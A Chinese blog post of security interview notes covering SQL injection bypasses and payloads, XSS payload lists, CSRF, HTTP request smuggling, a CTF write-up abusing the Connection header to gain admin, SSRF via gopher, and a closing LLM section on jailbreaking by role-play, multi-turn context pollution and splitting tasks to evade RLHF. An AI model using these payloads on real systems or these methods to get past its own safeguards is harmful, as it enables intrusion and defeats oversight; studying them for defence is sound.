---
layout: post
title: 用八十岁老奶也能听懂的话总结了面试常用的Web安全漏洞
date: 2025-12-23
categories: [安全, 面试]
tags: [Web安全, 面试, SQL注入, XSS, CSRF, SSRF, LLM攻防]
toc: true
author: GyroJ
---

> 面向 **后端 / 安全 / 开发岗面试**
> SQL 注入、PDO、CORS、XSS、CSRF、SSRF、XXE、本地/横向提权。
> 计划长期更新,这算是一本《永乐大典》吗？尽量人写，AI率控制在最低

---

## SQL注入

### 知识点收集整理
布尔盲注、时间盲注、二次注入、错误注入、如何使用sqlmap、如何进行fuzz

#### SQL语句的几种类型（从攻击者角度思考

DQL/DML，通常是单个参数查询或者设置，比如SELECT，INSERT，UPDATE，最简单的注入，可以通过ORM或者预输入处理来进行防护，但是防不住ORDER BY

DDL/DCL, 只能通过最小权限原则、黑白名单来处理



>***ORM（Object Relational Mapping）通过对象模型映射关系数据库，自动生成 SQL 并负责参数绑定。你不再手写 SQL，而是用代码操作"对象"，ORM 帮你安全地拼 SQL***。

---
### SQL注入绕过技巧

#### 基础绕过
**空格绕过**：`/**/`、`%09`(Tab)、`%0a`(换行)、`%0d`(回车)、`()`、`+`

**引号绕过**：`0x616461696e`(十六进制)、`CHAR(97,100,109,105,110)`、`CONCAT()`、`%df'`(宽字节)

**关键字绕过**：`SeLeCt`(大小写)、`selselectect`(双写)、`SEL/**/ECT`(内联注释)、`/*!50000SELECT*/`(版本注释)、`%53%45%4c%45%43%54`(URL编码)

**编码绕过**：`%27`(URL编码)、`%2527`(双重编码)、`%u0027`(Unicode)、`&#39;`(HTML实体)、Base64

**宽字节注入**：`%df'`(GBK)、`%a1'`(Big5)、`%81'`(Shift-JIS)

#### 语法替换
**逻辑运算符**：`&&`(替代AND)、`||`(替代OR)、`LIKE/IN()/BETWEEN/REGEXP`(替代=)

**函数替换**：`SUBSTR/MID/LEFT/RIGHT`(字符串截取)、`IF/CASE WHEN`(条件判断)、`BENCHMARK/GET_LOCK`(替代SLEEP)

**等价函数**：`@@version`(替代version())、`schema()`(替代database())、`current_user()`(替代user())、`||/+`(字符串连接)

#### 特殊场景
**参数污染**：`id=1&id=2` - 测试取第一个/最后一个/拼接

**堆叠查询**：`;DROP TABLE`、`;UPDATE`、`;EXEC xp_cmdshell`

**二次注入**：插入时被转义 → 查询时触发（未转义）

#### 时间盲注函数（按数据库）
- **MySQL**：`SLEEP(5)`、`BENCHMARK()`
- **SQL Server**：`WAITFOR DELAY '0:0:5'`
- **PostgreSQL**：`pg_sleep(5)`
- **Oracle**：`DBMS_LOCK.SLEEP(5)`

#### 报错注入函数（按数据库）
- **MySQL**：`updatexml()`、`extractvalue()`、`floor(rand()*2)`、`exp()`、`GeometryCollection()`
- **SQL Server**：`CONVERT(int, @@version)`
- **Oracle**：`utl_inaddr.get_host_address()`、`XMLType()`
- **PostgreSQL**：`CAST(version() AS int)`

#### 常用Payload
```sql
-- 判断列数
' ORDER BY 1-- / ' ORDER BY 2--

-- 联合注入
' UNION SELECT 1,2,3--
' UNION SELECT null,database(),user()--

-- 布尔盲注
' AND 1=1--
' AND SUBSTRING(database(),1,1)='a'--

-- 时间盲注
' AND IF(1=1,SLEEP(5),0)--

-- 报错注入
' AND updatexml(1,concat(0x7e,database()),1)--
```

### 面试问题
1.给你一个java应用白盒测试，如何快速查找可能的SQL注入点
#### 查找方法

查找高危API
```java
Statement
createStatement
execute
executeQuery
executeUpdate
addBatch
```
```java
// 危险模式 - 字符串拼接
String sql = "SELECT * FROM users WHERE id=" + userId;
Statement stmt = conn.createStatement();
stmt.executeQuery(sql);

// 危险模式 - MyBatis ${}
<select id="getUser">
  SELECT * FROM users WHERE name = '${userName}'
</select>
```
统计用户输入源，可以顺便检查一下是否存在java反序列化漏洞
```java
request.getParameter()
@RequestParam
@RequestBody
@PathVariable
@ModelAttribute
```
#### 审计要点
- 搜索关键字：`Statement`、`executeQuery`、`executeUpdate`、`${}(MyBatis)`
- 检查用户输入是否直接拼接到SQL
- 确认是否使用`PreparedStatement`和`#{}`(MyBatis)
- 是否存在字符串拼接、是否有不可参数化的 SQL 结构，以及 ORM 被误用的场景，
尤其是 ORDER BY、动态条件和原生 SQL，这些地方在真实项目中最容易出问题


## 浏览器背景知识补充概览

这部分我只放一个总结的树状图，类似思维导图的效果，具体每一部分的细节方面，需要去其他地方补充，整个知识体系全部串联起来的感觉是非常享受的，零零散散学的东西过几天就忘了，把浏览器内核全部看完，有种茅塞顿开的感觉。

>***知其然，知其所以然***

```
操作系统（Kernel / Hardware）
└── 浏览器主进程（Browser Process）【高权限】
    ├── 网络进程（Network Process）【受控高权限】
    ├── GPU 进程（GPU Process）【受控权限】
    ├── 渲染进程（Renderer Process）【低权限 / Sandbox】
    │   ├── V8（JavaScript Engine）
    │   ├── Blink（DOM / HTML / CSS）
    │   ├── DOM Tree
    │   ├── CSSOM
    │   └── Layout / Paint
    └── 工具 / 插件进程（Utility / Plugin）
```

```
Renderer Process（Sandboxed）
├── JavaScript 执行层
│   ├── V8 Runtime
│   │   ├── Interpreter（Ignition）
│   │   ├── JIT Compiler（TurboFan）
│   │   └── Garbage Collector
│   └── Web APIs（受限接口）
│       ├── fetch / XHR
│       ├── setTimeout / Promise
│       └── DOM API
│
├── 文档结构层
│   ├── HTML Parser
│   ├── DOM Tree
│   └── Shadow DOM
│
├── 样式与布局层
│   ├── CSS Parser
│   ├── CSSOM
│   ├── Layout Tree
│   └── Paint Records
│
└── IPC 通道（只能“请求”，不能“执行”）
    ├── → Network Process
    ├── → Browser Process
    └── → GPU Process
```
```
JavaScript (fetch / form / img)
└── Renderer Process
    └── IPC 请求
        └── Network Process
            ├── Cookie 匹配 + 附加
            ├── SameSite 判断
            ├── CORS / Preflight
            └── 发出真实 HTTP 请求
                └── Internet
```
一次完整的HTTPS请求过程
```
JS fetch("https://bank.com/api")
│
└── Renderer Process
    └── IPC：我要请求这个 URL
        │
        └── Network Process
            ├── DNS
            ├── TCP connect
            ├── TLS Handshake
            │   ├── ClientHello
            │   ├── ServerHello
            │   ├── Certificate
            │   └── Key Exchange
            ├── HTTP 请求（明文）
            ├── TLS 加密
            └── TCP 发包
                └── Internet
```
>*** 浏览器指纹是JS采集的，例如无头爬虫的主要检测方法就是```navigator.webdriver === true```，当然还包括其他很多信息，指纹识别是前端JS代码自动识别的结果，可以伪装 ***

Renderer RCE + Kernel LPE可以造成沙箱逃逸，从而利用浏览器拿下主机设备控制权。

具体案例：CVE-2021-1732，win32k 在处理窗口对象时存在 Use-After-Free，用户态可控指针被内核错误使用。这一块就涉及很多pwn相关的内容了，比如UAF的利用过程。看来，pwn才是做安全的必经之路啊。

>***看懂了浏览器内核，所有的xss、csrf这一类利用浏览器的漏洞就非常容易理解了***

## XSS

现在你应该对浏览器架构有一个非常完善的认知了，我希望你在面试的时候可以提出来什么是SPA、什么是CSP，理解这些，你也就懂xss的成因了，特别是dom-xss，实际上就是由于SPA的出现，SPA 将大量业务逻辑和状态管理前移到浏览器端，用户可控的数据往往直接参与前端路由和 DOM 更新，这显著放大了 DOM-XSS 的攻击面。
DOM-XSS 的本质并不在于是否与服务器交互，而是不可信数据在浏览器内部进入了可执行上下文。
URL fragment（锚点）本身只是浏览器侧的数据来源，CSP 并不会对其进行限制；但当这些数据被前端代码注入到 DOM 并触发脚本执行时，CSP 会在执行阶段生效。
实际上，许多所谓“hash-based XSS 绕过 CSP”的情况，并非 CSP 机制失效，而是由于 CSP 配置过于宽松，允许内联事件或危险 DOM API 的执行

>***CSP（Content Security Policy）由网站通过 HTTP 响应头或 HTML meta 标签声明，最终由浏览器强制执行。CSP配置正确的情况下可以用来防护Dom-XSS***

### XSS技能树
攻击
```
XSS 利用
├── 基础执行
│   ├── alert / console
│   └── Cookie / Storage
│
├── window 利用
│   ├── window.opener（tabnabbing）
│   ├── window.name（跨域存储）
│   ├── window.parent / top
│   └── postMessage 注入
│
├── iframe 利用
│   ├── 同源 iframe 提权
│   ├── 钓鱼 / UI 覆盖
│   ├── C2 / 持久控制
│   └── sandbox 误配置
│
├── 权限扩展
│   ├── CSRF
│   ├── SSRF
│   ├── 账号接管
│   └── 后台劫持
│
└── 持久化
    ├── localStorage
    ├── Service Worker（高级）
    └── WebSocket

```
```
绕过手段
├── 编码绕过
│   ├── HTML 实体
│   │   `<img src=x onerror=&lt;script&gt;alert(1)&lt;/script&gt;>`
│   │
│   ├── URL 编码
│   │   `<img src=x onerror=%61%6c%65%72%74(1)>`
│   │
│   └── Unicode
│       `<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>`
│
├── 事件触发
│   ├── onerror
│   │   `<img src=x onerror=alert(1)>`
│   │
│   ├── onload
│   │   `<body onload=alert(1)>`
│   │
│   └── SVG
│       `<svg><script>alert(1)</script></svg>`
│
├── 标签利用
│   ├── img
│   │   `<img src=x onerror=alert(1)>`
│   │
│   ├── svg
│   │   `<svg onload=alert(1)>`
│   │
│   ├── iframe
│   │   `<iframe srcdoc="<script>alert(1)</script>"></iframe>`
│   │
│   └── math
│       `<math><mtext onclick="alert(1)">X</mtext></math>`
│
├── 协议利用
│   ├── javascript:
│   │   `<a href="javascript:alert(1)">click</a>`
│   │
│   ├── data:
│   │   `<img src="data:image/svg+xml,<svg onload=alert(1)>">`
│   │
│   └── blob:
│       `URL.createObjectURL(new Blob(["<script>alert(1)</script>"],{type:"text/html"}))`
│
└── 框架特性
    ├── Vue v-html
    │   `<div v-html="'<img src=x onerror=alert(1)>'"></div>`
    │
    ├── React dangerouslySetInnerHTML
    │   `{ dangerouslySetInnerHTML:{__html:'<svg onload=alert(1)>'} }`
    │
    └── innerHTML 包装
        `element.innerHTML = "<iframe srcdoc='<script>alert(1)</script>'>"`
```

```
浏览器安全机制
├── SOP（同源策略）
│   └── ❌ 不防 XSS
│
├── CSP
│   ├── script-src
│   ├── unsafe-inline
│   └── nonce / hash
│
├── HttpOnly Cookie
│   └── 防 Cookie 窃取
│
└── sandbox iframe
```
```
防御
├── 输入验证（不可靠）
├── 输出编码（最关键）
│   ├── HTML Encode
│   ├── JS Encode
│   └── URL Encode
│
├── 禁用危险 API
│   ├── eval
│   ├── innerHTML
│
├── CSP
│   ├── 禁止 inline
│   ├── 禁止 eval
│
└── 框架自动转义

```
### 危害

* 窃取 Cookie（非 HttpOnly）
* 劫持登录态
* 钓鱼、键盘记录
* 配合 CSRF / SSRF

简单 XSS 防护示例

```php
function xss_filter($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}
```

> 不过滤输入，而是**在输出时做编码**


HttpOnly 为什么 JS 读不到 Cookie

```http
Set-Cookie: PHPSESSID=xxx; HttpOnly
```

* 浏览器禁止 `document.cookie` 访问
* 但 Cookie 仍会随请求发送

>👉 防 XSS 窃 Cookie，不防 CSRF

---
### XSS漏洞审计

#### 白盒审计
```java
// 危险代码模式
out.println("<div>" + userInput + "</div>");  // 未编码
response.getWriter().write(request.getParameter("name")); // 直接输出

// JSP中
<div>${param.name}</div>  <!-- JSTL默认转义，但某些情况例外 -->
<div><%=request.getParameter("name")%></div>  <!-- 危险 -->
```

**审计要点:**
- 和上面的SQL注入审计一样的方法论搜索：`getParameter`、`getAttribute`、输出函数
- 检查是否经过HTML编码：`StringEscapeUtils.escapeHtml4()`
- 检查富文本：是否使用白名单过滤（jsoup、OWASP AntiSamy）

### 黑盒审计
```bash
# 测试反射型XSS
http://target.com/search?q=<script>alert(1)</script>
http://target.com/page?name=<img src=x onerror=alert(1)>

# 测试存储型XSS
注册用户名: <svg/onload=alert(1)>
发表评论: "><script>alert(document.cookie)</script>

# 测试DOM-XSS
http://target.com/page#<img src=x onerror=alert(1)>
```
注意这里的#是重点，这个#，通俗的可以叫做锚点
#的作用：
不会发送到服务器：片段标识符（即#之后的内容）不会被包含在HTTP请求中。也就是说，当浏览器向服务器请求```http://target.com/page```时，#后面的部分不会发送到服务器，而是由客户端（浏览器）保留并使用。
客户端处理：由于片段标识符不会发送到服务器，因此服务器无法直接控制或访问它。它完全由客户端处理。这意味着，如果网页中的JavaScript代码读取了window.location.hash并进行了不安全的内嵌或执行，就可能导致安全问题（例如XSS）。
>***检测工具: XSStrike、Burp Suite、AWVS***

---

## CSRF
人话解释：CSRF就是我构造一个钓鱼网站，然后通过post提交表单到其他网站的api接口，此时浏览器自动带上了cookie，导致CSRF。
>***一些细节：CSRF 本质上只是利用浏览器发出请求，攻击者一般无法读取响应内容，这是由于浏览器同源策略的限制。***

详细一点解释：
CSRF 的产生源于浏览器对 Cookie 的自动携带机制，同源策略仅限制响应读取而不限制请求发送；SameSite Cookie 是现代防御核心，而一旦存在 XSS，CSRF 防护将被完全绕过；JSONP 则是历史上绕过同源策略、放大 CSRF 与信息泄露风险的典型设计缺陷。

### 面试遇到的问题：为什么后端api使用json不能完全防住csrf
原理上出发：传统csrf是使用浏览器直接发送表单，不能发送json数据，如果要发送json数据，就必须要调取JS，但是调取JS的过程中受到CORS的阻碍

CSRF 并不是不能发送 JSON，而是在没有 XSS 的前提下，浏览器不允许跨站页面构造并发送携带 application/json 的请求；因为会触发CORS预检(OPTIONS)因此“JSON API 看起来不容易被 CSRF”是浏览器安全模型的副作用，而不是 JSON 自身的安全性。
>***CORS预检：在发送跨站请求的时候会被触发，浏览器自动向服务器发送OPTIONS请求，询问浏览器：“接下来我要给你发一个这样的跨站请求，你能接受吗？”就算CORS配置不正确导致允许了这个cross-site请求的发送，后续的Same-Site安全策略依然会不携带cookie，双重保障***


`<form>` 的硬限制

HTML 表单 只能 发：
```
application/x-www-form-urlencoded
multipart/form-data
text/plain
```
Samesite的简单介绍：
```
a.example.com → b.example.com 是 same-site
evil.com → example.com 是 cross-site
```
1. ameSite=Strict（最严格）
只要是 cross-site 请求，一律不带 Cookie

2. SameSite=Lax（默认，最容易被误解）
行为规则（必须记住）
场景	是否带 Cookie
```python
same-site	                  ✅
cross-site GET（顶级导航）	  ✅
cross-site POST	                  ❌
<img> / <iframe>	          ❌
```
3. SameSite=None（最宽松）
所有请求都带 Cookie（只要 HTTPS + Secure）
>***JSON API 防 CSRF”的效果，其实是 SameSite=Lax 带来的副作用
SameSite 控制“带不带 Cookie”，CORS 控制“JS 能不能读响应”。***

### 一句话总结
在跨站场景下，提交 JSON 的 POST 请求是否携带 Cookie，取决于 Cookie 的 SameSite 属性而非 JSON 本身；在 SameSite=Lax 或 Strict 下，浏览器会阻止携带 Cookie，从而使 JSON 型 CSRF 失效，而在 SameSite=None 下则不会。

绕过方法：在表单中提交参数text={json数据}，后端解析的时候有可能会将其解析为json
### 补充
JSONP 是一种利用 `script` 标签绕过同源策略、允许跨域读取数据的历史方案；它本身不具备任何安全防护能力，也无法绕过 SameSite；在 SameSite=None 的情况下，JSONP 会自动携带 Cookie 并读取登录态数据，因此在现代安全实践中应当彻底禁用。

## HTTP相关漏洞
### http请求头走私
在反向代理架构中，如果前端代理与后端服务器对 Content-Length 与 Transfer-Encoding: chunked 的解析规则不一致，攻击者可构造畸形 HTTP 请求，使前端认为请求已结束，而后端继续解析剩余数据，从而将隐藏请求“走私”到后端，这种攻击称为 HTTP 请求走私。

可以用来绕过前端的WAF
### CVE-2020-11984（Apache HTTP Server）
在 Nginx 作为反向代理、Apache 作为后端的架构中，由于 Nginx 按 Content-Length 判断请求结束，而 Apache 按 Transfer-Encoding: chunked 解析请求体，攻击者可以构造歧义请求，在 Apache 中额外解析出被 Nginx 忽略的隐藏请求，从而形成 HTTP 请求走私漏洞，CVE-2020-11984 即是该类问题的典型代表。

```
Client
  ↓
Nginx 1.14.x / 1.16.x   （反向代理）
  ↓
Apache HTTPD 2.4.43     （应用服务器）
```

请求包示例：
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
```
前端解释的过程中，优先看Content-Length，忽略了后面的 GET请求的一部分，绕过了前端的WAF，将两个请求包传送到后端，达成攻击。

防护措施：

前端反向代理和后端同时拒绝 CL + TE，必要时后端可以再加一层WAF

### HTTP RFC利用漏洞

#### 原理
RFC 是互联网协议的“法律文本”，规定了协议必须如何实现，所有合规实现都必须遵守。
RFC中有一句原话：
***A proxy MUST remove any header listed in the Connection header.***
出现在 Connection 头字段中的 header，都是 hop-by-hop。
其余未被声明为 hop-by-hop 的 header，默认都是 end-to-end。

hop by hop的header会被删除，删除的时间节点在HTTP 解析完成之后、转发请求生成之前

>***凡是被 Connection 声明过的字段，都不能转发***

#### 强网杯2025 Secret Vault
一个python的web app。flask。有个go的鉴权服务器。这个服务器有个后端，来自```github.com/gorilla/mux```，有一段签名逻辑，开在4444端口

go的鉴权服务器有个中间件。开在5555，会从主服务器（5000）中获取JWT密钥，验证并提取uid，然后删掉一些头：
```go
        req.Header.Del("Authorization")
        req.Header.Del("X-User")
        req.Header.Del("X-Forwarded-For")
        req.Header.Del("Cookie")
```
然后将X-User设置为uid。

客户机向主服务器（5000）交一段JWT的auth信息，通过过中间件处理后，会返回uid。如果中间件验证失败就是anonymous，也就是鉴权失败。

他这个主服务器上的鉴权：
```python
    def login_required(view_func):
        @wraps(view_func)
        def wrapped(*args, **kwargs):
            uid = request.headers.get('X-User', '0')
            print(uid)
            if uid == 'anonymous':
                flash('Please sign in first.', 'warning')
                return redirect(url_for('login'))
            try:
                uid_int = int(uid)
            except (TypeError, ValueError):
                flash('Invalid session. Please sign in again.', 'warning')
                return redirect(url_for('login'))
            user = User.query.filter_by(id=uid_int).first()
            if not user:
                flash('User not found. Please sign in again.', 'warning')
                return redirect(url_for('login'))

            g.current_user = user
            return view_func(*args, **kwargs)

        return wrapped
```
如果获取失败uid就是0，uid是0的用户正好是admin。
```
            user = User(
                id=0,
                username='admin',
                password_hash=password_hash,
                salt=base64.b64encode(salt).decode('utf-8'),
            )
```
所以我们现在就是要想个办法让中间件的返回头里没有 X-User
```go
func main() {
    authorizer := &httputil.ReverseProxy{Director: func(req *http.Request) {
        req.URL.Scheme = "http"
        req.URL.Host = "127.0.0.1:5000"

        uid := GetUIDFromRequest(req)
        log.Printf("Request UID: %s, URL: %s", uid, req.URL.String())
        req.Header.Del("Authorization")
        req.Header.Del("X-User")
        req.Header.Del("X-Forwarded-For")
        req.Header.Del("Cookie")

        if uid == "" {
            req.Header.Set("X-User", "anonymous")
        } else {
            req.Header.Set("X-User", uid)
        }
    }}
}
```
我们传入：
```
Connection: close,X-User
```
此时不管中间件传回怎样的X-User值，在客户机与中间件的Connection被Connection Header给close掉之后，也根据RFC HTTP1/1的规范（为了向下兼容）将X-User置空。因此我们得到了空的X-User。

在uid = request.headers.get('X-User', '0')中，我们得到了uid为0的用户的登录权限。

### HTTP Host头写法，常用于绕过ssrf的一些过滤

1.合法格式
```
Host: example.com                    # 仅域名
Host: example.com:8080              # 域名+端口
Host: 192.168.1.100                 # IPv4
Host: 192.168.1.100:3000            # IPv4+端口
Host: [2001:db8::1]                 # IPv6（方括号）
Host: [2001:db8::1]:8080            # IPv6+端口
Host: localhost                      # localhost
Host: localhost:3000                 # localhost+端口
```
2.非法格式
```
Host: http://example.com            # ❌ 不能包含协议
Host: example.com/path              # ❌ 不能包含路径
Host: user@example.com              # ❌ 不能包含用户信息
```
3.安全利用 
```
# 绕过检测
Host: 127.0.0.1        # 标准格式
Host: 127.1            # 省略格式
Host: 2130706433       # 十进制格式
Host: 0x7f000001       # 十六进制格式
```

## SSRF
同样的，给出总结的能力树，具体细节，需要具体研究。事实上，ssrf漏洞并非必须要使用gopher协议才能写入redis执行命令，在某些配置有问题的场景下，ssrf可以完全控制http，依然可以直接构造tcp流传给redis，达成执行命令的效果。(Protocol Smuggling via SSRF)因为这一点导致我在某场面试中失利。面试官想要考察的是SSRF利用Gopher来打服务器内部的redis这一类服务，达成执行命令的效果，结果我这个案例直接没有经过gopher，运气不好是这样的。

```
SSRF
├── ① 基础 SSRF（Outbound HTTP）
│   ├── 能访问外部 URL
│   └── 只能访问开发者预期的资源
│
├── ② 内网可达 SSRF（Network Pivot）
│   ├── 可访问 127.0.0.1 / 内网 IP
│   ├── 可探测端口 / 服务存活
│   └── 风险：信息泄露 / 管理接口暴露
│
├── ③ 可回显 SSRF（Full HTTP SSRF）
│   ├── 能读取响应内容
│   ├── 可访问内部 Web / API
│   └── 风险：配置泄露 / 未授权访问
│
├── ④ Blind SSRF（Side-channel SSRF）
│   ├── 无直接回显
│   ├── 通过 DNS / 延迟 / 日志判断
│   └── 风险：内网探测 / 云环境利用
│
├── ⑤ 协议扩展 SSRF（Protocol Abuse）
│   ├── file://
│   │   └── 本地文件读取（视实现而定）
│   │
│   ├── ftp:// / dict://
│   │   └── 较少见，影响有限
│   │
│   └── ★ gopher://  ←【质变点】
│       ├── 任意 TCP 连接
│       ├── 任意字节写入
│       └── SSRF → 内网协议攻击
│
├── ⑥ 内网服务控制（Service Takeover）
│   ├── Redis / Memcached
│   ├── 内部 Admin / Debug 接口
│   ├── Docker / Kubelet API
│   └── 风险：横向移动 / 主机控制
│
├── ⑦ 云元数据 SSRF（Cloud Pivot）
│   ├── 169.254.169.254
│   ├── 获取 IAM / RAM / Token
│   └── 风险：云资源接管
│
└── ⑧ 基础设施级失陷（Infra Compromise）
    ├── 云主机接管
    ├── 容器逃逸
    └── 整个环境失控
```

## LLM攻防初步了解
>***你知道的，我特别喜欢知识树这种东西，因为人的大脑内部对数据的存储，其实也是树状图***

```
LLM 攻防知识树
│
├── 1. 基础认知（Threat Model）
│   │
│   ├── 1.1 LLM 本质
│   │   ├── 概率语言模型（Next Token Prediction）
│   │   ├── 无真实权限系统
│   │   └── 对齐 + 规则 ≠ 安全边界
│   │
│   ├── 1.2 安全假设缺陷
│   │   ├── 输入即指令
│   │   ├── 语言即代码
│   │   └── 数据 / 指令不可区分
│   │
│   └── 1.3 威胁目标
│       ├── 违背对齐
│       ├── 越权能力使用
│       └── 信息泄露
│
├── 2. 攻击面（Attack Surface）
│   │
│   ├── 2.1 输入面
│   │   ├── User Prompt
│   │   ├── 多轮上下文
│   │   └── 多模态输入（文本 / 图像 / OCR）
│   │
│   ├── 2.2 上下文面
│   │   ├── System Prompt
│   │   ├── Developer Prompt
│   │   └── Memory / Session Context
│   │
│   └── 2.3 能力面
│       ├── Tool / Function Calling
│       ├── Agent Loop
│       └── RAG（检索增强生成）
│
├── 3. Prompt 级攻击（核心）
│   │
│   ├── 3.1 Prompt Injection
│   │   ├── 3.1.1 直接注入
│   │   │   ├── 指令覆盖
│   │   │   └── 系统意图重写
│   │   │
│   │   └── 3.1.2 间接注入（重点）
│   │       ├── 网页内容注入
│   │       ├── 文档 / PDF 注入
│   │       └── RAG 文档注入
│   │
│   ├── 3.2 Jailbreak（越狱）
│   │   ├── 指令覆盖型
│   │   ├── 角色扮演型
│   │   └── 多轮诱导型
│   │
│   └── 3.3 上下文操控
│       ├── 长上下文稀释
│       ├── 安全规则遗忘
│       └── 历史对话污染
│
├── 4. 模型级 / Token 级攻击
│   │
│   ├── 4.1 Token Smuggling
│   │   ├── Unicode 绕过
│   │   ├── 分词边界利用
│   │   └── 控制字符
│   │
│   ├── 4.2 Adversarial Prompt
│   │   ├── 对抗样本
│   │   ├── Embedding 空间诱导
│   │   └── 概率偏置攻击
│   │
│   └── 4.3 对齐绕过
│       ├── 规则冲突诱导
│       └── 安全策略博弈
│
├── 5. Tool / Agent 攻击（高危）
│   │
│   ├── 5.1 Tool Injection
│   │   ├── 非预期工具调用
│   │   ├── 参数污染
│   │   └── 能力越权
│   │
│   ├── 5.2 Agent Loop Hijacking
│   │   ├── 思考链劫持
│   │   ├── 反馈欺骗
│   │   └── 无限行动循环
│   │
│   └── 5.3 AI 版传统漏洞
│       ├── AI-SSRF
│       ├── AI-RCE
│       └── AI-SQLi
│
├── 6. RAG 攻击
│   │
│   ├── 6.1 数据投毒
│   │   ├── 恶意知识文档
│   │   └── 长期持久污染
│   │
│   ├── 6.2 检索劫持
│   │   ├── Top-K 诱导
│   │   └── 相似度操控
│   │
│   └── 6.3 上下文注入
│       ├── 检索结果即指令
│       └── 隐式 Prompt Injection
│
├── 7. 防御体系
│   │
│   ├── 7.1 基础防御
│   │   ├── Alignment（RLHF）
│   │   ├── 内容过滤
│   │   └── 拒绝策略
│   │
│   ├── 7.2 工程级防御（关键）
│   │   ├── Prompt 分层隔离
│   │   ├── 指令 / 数据分离
│   │   └── 上下文去指令化
│   │
│   ├── 7.3 Tool / Agent 防御
│   │   ├── 最小权限原则
│   │   ├── 白名单调用
│   │   ├── 参数校验
│   │   └── Human-in-the-loop
│   │
│   └── 7.4 高级防御
│       ├── LLM-as-a-Judge
│       ├── 双模型交叉验证
│       ├── 对抗训练
│       └── 输出一致性检测
│
└── 8. 安全范式映射
    │
    ├── Web 安全映射
    │   ├── SQLi → Prompt Injection
    │   ├── XSS → Indirect Injection
    │   └── RCE → Tool Hijacking
    │
    └── 安全工程趋势
        ├── AI Red Team
        ├── LLM 安全评测
        └── AI 原生安全架构
```
### LLM基础知识（安全视角

>***LLM 本质上是一个：在给定上下文条件下，持续预测“下一个 token 最可能是什么”的概率引擎***

LLM眼中只有这些东西：
```
System Prompt
Developer Prompt
User Prompt
```
System Prompt是LLM建立的基础，定义了安全规则、身份、边界，上下文中最靠前，权重最高的prompt，很难攻破；

Developer Prompt 定义了业务逻辑、使用规范、工具说明，常见的越狱目标也就是这个；

User Prompt 也就是用户所控制的token。

这里简单介绍一下Embedding，意思就是把文字映射为向量，最直观的表达，不用深刻理解，Embedding就是把自然语言或者其他东西映射到LLM的向量空间中，类似于一个个点，根据概率模型来输出。这里就涉及所谓的“LLM越狱”，可以理解为：把自然语言当作一个点放在一个平面上，这个平面上面被一圈围栏围住，也就是所谓的“监狱”。

到了这一步，我们理所应当地可以提出所谓的LLM越狱的方法，第一步，尝试找到 ***对齐边界***，也就是监狱的墙壁，然后我们贴着墙壁走，就可以找到薄弱点突破。
#### 资产与边界识别

目标：搞清楚“你在测什么”。
模型结构（base + safety / reward head）

对齐方式（RLHF / RLAIF / 规则后处理）

输入来源：System / Developer Prompt User Input Web / PDF / RAG Logs / DB

能力边界：Tool / Agent / API 外部执行权限

完成这一步之后，我们得到了一个攻击面清单

>***感觉所有从漏洞测试基本方法论都是一样的：找用户输入点，找内部数据接收点***

#### 对齐机制分析（白盒核心）

用人话解释：找到安全策略是如何生效的，拒绝逻辑位置：

在模型内找到Safety classifier（安全分类器）、后处理规则、高惩罚 token / 语义、Reward / Safety score 变化趋势等内容，这个时候我们大概得到了对齐边界的初步轮廓

>***安全分类器是使用模型语义检测过滤，后处理规则相当于黑名单检测***

#### 单轮/多轮边界检测
单轮检测的作用是建立一个静态的安全基线，使用危险语义的近义词或者其他的一些方式来尝试。还记得我们刚才提到的Embedding吗？ok，这里的意思就是说使用近义词来进行Embedding映射到向量空间中的位置实际是差不多的，但是我们要测量出这么一点点的偏差，建立一个静态的安全基线，我们现在大概知道模型在单轮测试，也就是上下文未被污染的情况下能做到什么输出，不能做到什么输出。至此，我们得到了单轮对齐边界范围。

然后是多轮上下文测试，这是最重要的一步

我们可以尝试：上下文污染、渐进式语义逼近、连贯性 vs 安全性冲突

重点观察：拒绝阈值是否下降、安全提示是否弱化

我们需要验证“边界是否随对话移动”

#### Prompt注入攻击

到这里正式开启我们的一个注入攻击，可以尝试各种绕过方法、使用图片、文档、指令、混合翻译、字符编码之类的各自上一遍试一下。

具体一点的几种方法：角色扮演、多模态攻击、RAG（检索增强生成）攻击。

这里我想多聊两句角色扮演这个事情，因为这里是我实践过的，确实起作用了，这一点在最近的各种模型中都有用，不保证一定有用，但运气好的话确实可以越狱成功。这里我的核心关键点是“让大模型误以为不是自己在违规”这种手段可以绕过很多很多的限制，最起码，基础的Safety classifier肯定是可以绕过的，后处理规则就不一定了。

### 面试问题：给你一个白盒测试LLM，你要如何下手？
这其实不是一个正向的问题，我们刚才的思想可以起效，但实际上，最快的方法是逆向调试的思想
（我都给你白盒了你还黑盒测试那我不是白给了吗？）

#### 第一阶段：安全机制与约束面识别

在任何尝试"越狱"之前，我会先做安全架构拆解。

**明确安全约束生效位置**

重点确认三类约束是否存在，以及谁是"主导约束"：

1. **模型内对齐**
   - 是否经过 RLHF / RLAIF
   - 拒绝是否由模型自然生成

2. **外部安全模型**
   - 是否存在 Safety Classifier
   - 是否有明确阈值

3. **工程后处理**
   - 黑词 / 正则 / 固定拒绝模板

**这一阶段的结论是：**

- 当前模型的"拒绝"主要来自哪一层
- 这直接决定后续攻击策略。

#### 第二阶段：安全边界的可观测化

白盒测试的核心优势在于：安全边界是可以被量化的。

**2.1 关键观测信号**

在推理过程中重点监控：
- Token-level logits
- Refusal / apology 类 token 的概率变化
- Reward score（如可获取）
- Safety score（如存在）
- 输出风格变化（解释 → 抽象 → 说教）

**2.2 边界定位方法**

我关注的不是"拒绝发生"，而是：模型是在哪一个 token 或语义阶段开始"犹豫"的。

常见边界信号包括：
- reward 曲线突然下降
- 模型开始泛化、抽象化回答
- attention 明显转向安全相关子空间

这个位置即为安全边界触发点。

#### 第三阶段：惩罚来源拆解（核心步骤）

**3.1 区分惩罚类型**

我会区分两类惩罚来源：

1. **Token 级惩罚**
   - 某些词一出现即触发负向反馈

2. **语义级惩罚**
   - 单词无害，但整体意图被识别为违规

**3.2 实践验证方式**

通过对照实验：

- 固定语义，替换词汇 → 观察 reward / safety 是否恢复
- 固定词汇，改变任务结构 → 观察是否仍被惩罚

目的是确认：模型是在"害怕某些词"，还是"拒绝某类行为"。

#### 第四阶段：针对对齐方式的定向尝试

**4.1 针对 RLHF / RLAIF（模型内约束）**

策略不是强行索取结果，而是：

- 将高风险任务拆分为多个 reward-neutral 子任务
- 将"执行型请求"转为：
  - 分析
  - 评估
  - 历史或理论讨论
